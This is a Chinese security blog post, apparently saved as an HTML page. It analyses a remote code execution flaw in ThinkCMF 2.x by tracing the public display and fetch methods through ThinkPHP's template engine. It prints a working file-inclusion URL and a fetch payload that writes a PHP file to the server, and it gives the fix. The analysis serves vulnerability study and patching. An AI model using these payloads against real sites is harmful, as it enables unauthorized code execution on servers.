@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Thinkcmf 2.x Getshell分析 | chriskali&#39;s blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://chriskalix.github.io/favicon.ico?v=1592112345647">
+<link rel="stylesheet" href="https://chriskalix.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="环境
+windows
+phpstudy (php7.2.9)
+thinkcmf 2.2.2
+具体分析
+首先在index.php中定义了项目路径为application/
+在入口点控制器application/Portal/Controlle..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://chriskalix.github.io">
+        <img src="https://chriskalix.github.io/images/avatar.png?v=1592112345647" class="site-logo">
+        <h1 class="site-title">chriskali&#39;s blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      Keep learning
+    </div>
+    <div class="site-footer">
+      chriskalix | <a class="rss" href="https://chriskalix.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Thinkcmf 2.x Getshell分析</h2>
+            <div class="post-date">2020-06-14</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="环境">环境</h2>
+<p>windows<br>
+phpstudy (php7.2.9)<br>
+thinkcmf 2.2.2</p>
+<h2 id="具体分析">具体分析</h2>
+<p>首先在<code>index.php</code>中定义了项目路径为<code>application/</code><br>
+在入口点控制器<code>application/Portal/Controller/IndexController.class.php</code>中只定义了一个index函数，但是因为继承了<code>HomebaseController</code>类，可以调用<code>HomebaseController</code>中属性为public的函数<br>
+跟进<code>application/Common/Controller/HomebaseController.class.php</code>，其中需要关注的是两个函数，分别为display以及fetch</p>
+<h3 id="getshell方法1">Getshell方法1</h3>
+<p>通过display方法getshell</p>
+<pre><code class="language-php">/**
+    * 加载模板和页面输出 可以返回输出内容
+    * @access public
+    * @param string $templateFile 模板文件名
+    * @param string $charset 模板输出字符集
+    * @param string $contentType 输出类型
+    * @param string $content 模板输出内容
+    * @return mixed
+    */
+public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
+    parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
+}
+</code></pre>
+<p><code>display</code>函数的注释中也提及了，用于加载模板和页面输出，这里存在的是任意文件包含漏洞。<br>
+这里使用a参数指定方法，传入<code>templateFile</code>参数可直接完成本地包含，本地测试payload为<code>?a=display&amp;templateFile=README.md</code><br>
+那么如何Getshell呢？Sp4ce师傅的<a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw">文章</a>中使用的是通过报错的方法，将shell写入当天的日志，然后通过包含日志执行写入shell，然后连接shell即可</p>
+<p>这边讲的稍微浅一点，在Getshell方法2中补全</p>
+<h3 id="getshell方法2">Getshell方法2</h3>
+<p>通过fetch方法</p>
+<pre><code class="language-php">/**
+    * 获取输出页面内容
+    * 调用内置的模板引擎fetch方法，
+    * @access protected
+    * @param string $templateFile 指定要调用的模板文件
+    * 默认为空 由系统自动定位模板文件
+    * @param string $content 模板输出内容
+    * @param string $prefix 模板缓存前缀*
+    * @return string
+    */
+public function fetch($templateFile='',$content='',$prefix=''){
+    $templateFile = empty($content)?$this-&gt;parseTemplate($templateFile):'';
+    return parent::fetch($templateFile,$content,$prefix);
+}
+</code></pre>
+<h4 id="深入查看">深入查看</h4>
+<p>大多数的文章一般就是引用一下<code>payload</code>手动复现，之前我也没有看过thinkcmf这个框架，只是看别人文章里说的，是基于<code>thinkphp3.x</code>封装的，决定静态的去跟踪一下，深入理解。<br>
+<code>parent::fetch</code>调用父类的fetch，看下函数定义<code>class HomebaseController extends AppframeController</code>，在<code>AppframeController</code>下并无fetch方法，继续查看，发现就是调用了Think模块下的Controller</p>
+<pre><code class="language-php">namespace Common\Controller;
+use Think\Controller;
+class AppframeController extends Controller
+</code></pre>
+<p>所以fetch函数本质上就是从Thinkphp的Controller中抽象出来，没有其他区别。继续跟进<code>simplewind/Core/Library/Think/Controller.class.php</code>，函数如下</p>
+<pre><code class="language-php">protected function fetch($templateFile='',$content='',$prefix='') {
+    return $this-&gt;view-&gt;fetch($templateFile,$content,$prefix);
+}
+</code></pre>
+<p>调用了view下的fetch，找到在<code>__construct()</code>中被初始化</p>
+<pre><code class="language-php">public function __construct() {
+    Hook::listen('action_begin',$this-&gt;config);
+    //实例化视图类
+    $this-&gt;view     = Think::instance('Think\View');
+    //控制器初始化
+    if(method_exists($this,'_initialize'))
+        $this-&gt;_initialize();
+}
+</code></pre>
+<p>继续跟进，为<code>simplewind/Core/Library/Think/View.class.php</code>，第106行找到fetch函数，如下所示</p>
+<pre><code class="language-php">public function fetch($templateFile='',$content='',$prefix='') {
+    if(empty($content)) {
+        $templateFile   =   $this-&gt;parseTemplate($templateFile);
+        // 模板文件不存在直接返回
+        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
+    }else{
+        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
+    }
+    // 页面缓存
+    ob_start();
+    ob_implicit_flush(0);
+    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
+        $_content   =   $content;
+        // 模板阵列变量分解成为独立变量
+        extract($this-&gt;tVar, EXTR_OVERWRITE);
+        // 直接载入PHP模板
+        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
+    }else{
+        // 视图解析标签
+        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
+        Hook::listen('view_parse',$params);
+    }
+    // 获取并清空缓存
+    $content = ob_get_clean();
+    // 内容过滤标签
+    Hook::listen('view_filter',$content);
+    // 输出模板文件
+    return $content;
+}
+</code></pre>
+<p><code>Getshell方法1</code>的函数也在这个文件下。找到真正的fetch函数，分析一下。<br>
+这里有一些函数是thinkphp中自带的几个较为重要的函数，如fetch函数中的E，L，C。翻阅了一下资料，做一个简单补充。<br>
+C方法：简单的理解为Config，即是用于设置、获取、以及保存配置参数的方法。其中的C('TMPL_ENGINE_TYPE')即为获取配置值<br>
+E方法：即为Error，具体就为throw new Think\Exception($msg, $code);<br>
+L方法：代表Language，用于获得语言变量</p>
+<p>回到fetch函数继续进行分析。fetch函数下较为简单，只是两个if语句判断。</p>
+<p>第一个if语句判断是否传入<code>$content</code>参数。第二处判断<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>，下断点调试后得到<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>的值为think，走到else分支。不太了解的是Hook::listen，故去检索。文章中提到，<code>Hook::listen</code>通过遍历某个行为标签的所有行为，依次实例化并且调用run方法。找到最終将<code>$param</code>参数传入<code>simplewind/Core/Library/Behavior/ParseTemplateBehavior.class.php</code>，找到其中run方法，如下所示：</p>
+<pre><code class="language-php">public function run(&amp;$_data){
+    $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
+    $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
+    $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
+    if('think'==$engine){ // 采用Think模板引擎
+        if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) 
+            ||  $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // 缓存有效
+            //载入模版缓存文件
+            Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
+        }else{
+            $tpl = Think::instance('Think\\Template');
+            // 编译并加载模板文件
+            $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']);
+        }
+    }else{
+        // 调用第三方模板引擎解析和输出
+        if(strpos($engine,'\\')){
+            $class  =   $engine;
+        }else{
+            $class   =  'Think\\Template\\Driver\\'.ucwords($engine);
+        }
+        if(class_exists($class)) {
+            $tpl   =  new $class;
+            $tpl-&gt;fetch($_content,$_data['var']);
+        }else {  // 类没有定义
+            E(L('_NOT_SUPPORT_').': ' . $class);
+        }
+    }
+}
+</code></pre>
+<p>即是一个嵌套判断。首先<code>$engine</code>为think，走进第一层if判断中。<code>$_data['content']</code>不为empty，<code>$this-&gt;checkContentCache</code>为False，<code>$this-&gt;checkCache</code>也为false，走到else分支。(这边就不再详细跟进具体函数，不然太长了)。之后执行两个操作，<code>Think::instance('Think\\Template')以及$tpl-&gt;fetch($_content,$_data['var'],$_data['prefix'])</code>。</p>
+<p>跟进fetch，具体为</p>
+<pre><code class="language-php">public function fetch($templateFile,$templateVar,$prefix='') {
+    $this-&gt;tVar         =   $templateVar;
+    $templateCacheFile  =   $this-&gt;loadTemplate($templateFile,$prefix);
+    Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl');
+}
+</code></pre>
+<p>在<code>$this-&gt;loadTemplate</code>的时候写入了缓存模板文件。</p>
+<p>调用<code>Storage::load</code>，如下</p>
+<pre><code class="language-php">public function load($_filename,$vars=null){
+    if(!is_null($vars)){
+        extract($vars, EXTR_OVERWRITE);
+    }
+    include $_filename;
+}
+</code></pre>
+<p>再通过include包含进来，执行php代码。以上都是跟着文章中的payload一步步调试跟进。其实到thinkcmf抽象的fetch之后的，都算是Thinkphp的问题吧...</p>
+<h4 id="payload">payload</h4>
+<p>在index路径下写入<code>phpinfo()</code>的payload为</p>
+<pre><code class="language-txt">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;
+</code></pre>
+<h2 id="知识点困惑点">知识点&amp;困惑点</h2>
+<p>很多文章中都提及到了thinkphp中的g\m\a，即分组\控制器\方法。文中提及到的方法均为通过直接使用方法去调用父类的public函数。困惑的地方为官方文档中提及到的，也有m\c\a这个概念，即module\controller\application(总觉得好像是一样的，暂时先埋个坑，后续我再去翻阅文档)</p>
+<h2 id="修复">修复</h2>
+<p>将display和fetch两个函数都改为protected</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://xz.aliyun.com/t/6626#toc-5">先知文章</a></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/">
+                  <h3 class="post-title">
+                    Redis攻击备忘录
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
